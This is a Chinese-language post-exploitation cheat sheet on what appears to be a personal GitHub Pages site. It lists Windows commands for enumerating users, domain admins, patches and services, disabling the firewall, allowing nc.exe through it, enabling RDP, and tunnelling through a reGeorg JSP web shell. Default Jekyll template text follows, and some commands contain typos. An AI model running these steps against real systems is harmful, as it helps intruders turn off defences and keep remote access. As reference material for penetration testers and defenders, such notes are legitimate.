## 後滲透筆記

systeminfo	系統資訊

systeminfo | findstr /B /C:"OS名稱" /C:"OS版本"	查看特定資訊

wmic os get caption	查看作業系統

whoami	當前使用者

whoami /priv	當前使用者權限

ipconfig /displaydns	DNS暫存

route print	路由表

arp -a	

hostname	

net user	

net user UserName	關於使用者資訊

net localgroup administrators	本機管理者帳號

net user /domain	網域使用者

wmic useraccount get /all 	網域使用者詳細資訊

net group "domain admins" /domain	網域管理者帳號

net use \SMBPATH Pa$$w0rd /u:UserName	連接SMB

net localgroup	列出所有Group

net localgroup GROUP	列出指定Group資訊

net view \127.0.0.1	會話打開到當前電腦

net session	開放給其他電腦

DRIVERQUERY	列出安裝的驅動

tasklist /svc	列出task and service

Tasklist /svc|find "TermService"	查看PID

netstat -ano|find "3389"

net start	列出啟動的服務

dir /s foo	目錄搜尋指定的關鍵字

dir /s foo == bar	同上

sc query	列出所有服務

sc qc "Service"	查服務

sc qc ServiceName	找到指定服務的路徑

shutdown /r /t 0	立即重啟

type file.txt	列出檔案內容

icacls “C:\Example”	列出權限

systeminfo	列出已安装的補丁

wmic qfe get Caption,Description,HotFixID,InstalledOn	列出已安装的補丁

wmic qfe get Description,HotFixID,InstalledOn

wmic qfe get Description,HotFixID,InstalledOn | findstr /C:"KB4346084" /C:"KB4509094"  列出指定補丁

wmic product get name,version	查看目前安裝程序

# 共享目錄
net share

wmic share get name,path,status

### 防火牆設定
netsh firewall show config	顯示防火牆配置

netsh firewall set opmode disable	關閉防火牆(2003及以前版本)

netsh advfirewall set allprofiles state off	關閉防火牆(2003之後版本)

netsh firewall add allowedprogram c:\nc.exe "allow nc" enable	允許程式通過 (2003及以前版本)

netsh advfirewall fireall add rule name="pass nc" dir=in action=allow program="c:\nc.exe"	允許程式通過 (2003之後版本)

netsh advfirewall firewall add rule name"Allow nc" dir=out action=alow program="C:\nc.exe"

netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3398 action=allow	允許3389通過

netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"	定義防火牆log存放位置

### 遠端服務
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber	查看遠端連結port(0xd3d)

開啟3389port#WinSer2003

wmic path win32_terminalservicesetting where (_CLASS !="") call setallowtsconnections 1	

開啟3389port#WinSer2008、2012

wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (_CLASS !="") call setallowtsconnections 1

wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1

reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /fSingleSessionPerUser

### reGeorg
[regeorg](https://github.com/sensepost/reGeorg)

python re.py -p 7788 -u http://xxxxxxxxxxx/222.jsp

proxychains rdesktop 127.0.0.1	//後續連接3389

### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/cr810831cs07g/cr810831cs07g.GitHub.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
